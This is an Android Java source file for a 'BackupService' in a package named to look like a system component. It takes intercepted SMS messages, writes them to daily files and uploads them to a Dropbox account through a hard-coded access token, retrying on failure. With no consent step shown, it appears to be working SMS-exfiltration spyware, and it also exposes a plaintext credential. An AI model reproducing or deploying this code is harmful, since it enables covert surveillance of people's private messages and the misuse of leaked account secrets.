package com.android.commstat;

import android.app.IntentService;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.text.TextUtils;

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by Scout on 12.12.2016.
 */
public class BackupService extends IntentService {

    public static final String SMS = "sms";
    private static final String DROPBOX_ACCESS_TOKEN = "Y09locXg68AAAAAAAAAAXrx09PJ-YKhiCHJqWpgiVrmgBJ22iP4o4_TRK5QqZCM2";
    private static final String MESSAGES_FOLDER = "messages";

    private final ArrayList<Sms> mMessages = new ArrayList<>();
    private boolean mIsBusy;

    public BackupService() {
        super(BackupService.class.getName());
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent == null || intent.getExtras() == null) {
            return;
        }
        Object messageObj = intent.getExtras().getSerializable(SMS);
        if (messageObj != null) {
            if (messageObj instanceof Sms) {
                synchronized (mMessages) {
                    mMessages.add((Sms) messageObj);
                }
                startQueue();
            }
        }
    }

    private void startQueue() {
        if(mIsBusy) {
            return;
        }
        mIsBusy = true;
        boolean isBreak = false;
        while (mMessages.size() > 0) {
            final Sms sms;
            synchronized (mMessages) {
                sms = mMessages.remove(0);
            }
            try {
                sendMessage(sms);
            } catch (Exception e) {
                e.printStackTrace();
                Timer timer = new Timer();
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        synchronized (mMessages) {
                            mMessages.add(sms);
                        }
                        mIsBusy = false;
                        startQueue();
                    }
                }, 5000);
                isBreak = true;
                break;
            }
        }
        if(!isBreak) {
            mIsBusy = false;
        }
    }

    private void sendMessage(final Sms message) throws Exception {
        final String fileName = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(message.Date.getTime()) + ".txt";
        File file = getMessageFile(fileName);
        if(file == null) {
            return;
        }

        DbxClientV2 client = new DbxClientV2(DbxRequestConfig.newBuilder("CommStat").build(), DROPBOX_ACCESS_TOKEN);
        ListFolderResult result = client.files().listFolder("");
        Metadata messagesFolder = null;
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), MESSAGES_FOLDER)) {
                    messagesFolder = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }

        if(messagesFolder == null) {
            messagesFolder = client.files().createFolder("/" + MESSAGES_FOLDER);
        }
        Metadata messagesFile = null;
        result = client.files().listFolder(messagesFolder.getPathDisplay());
        while (true) {
            for (Metadata metadata : result.getEntries()) {
                if(TextUtils.equals(metadata.getName(), fileName)) {
                    messagesFile = metadata;
                    break;
                }
            }
            if (!result.getHasMore()) {
                break;
            }
            result = client.files().listFolderContinue(result.getCursor());
        }
        if(messagesFile != null && file.length() == 0) {
            OutputStream os = null;
            try {
                os = new FileOutputStream(file);
                client.files().downloadBuilder(messagesFile.getPathDisplay()).download(os);
            } finally {
                if(os != null) {
                    os.flush();
                    os.close();
                }
            }
        }
        FileWriter writer = null;
        try {
            writer = new FileWriter(file, true);
            writer.append(message.toString() + "\r\n");
        } finally {
            if(writer != null) {
                writer.flush();
                writer.close();
            }
        }
        InputStream is = null;
        try {
            is = new FileInputStream(file);
            client.files().uploadBuilder("/" + MESSAGES_FOLDER + "/" + file.getName())
                    .withMode(messagesFile != null ? WriteMode.OVERWRITE : WriteMode.ADD)
                    .uploadAndFinish(is);
        } finally {
            if(is != null) {
                is.close();
            }
        }
    }

    private File getMessageFile(final String fileName) {
        File messageDir = new File(getFilesDir().getAbsolutePath(), MESSAGES_FOLDER);
        if (!messageDir.exists() && !messageDir.mkdir()) {
            return null;
        }
        File file = new File(messageDir, fileName);
        try {
            if (!file.exists() && !file.createNewFile()) {
                return null;
            }
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        return file;
    }

}
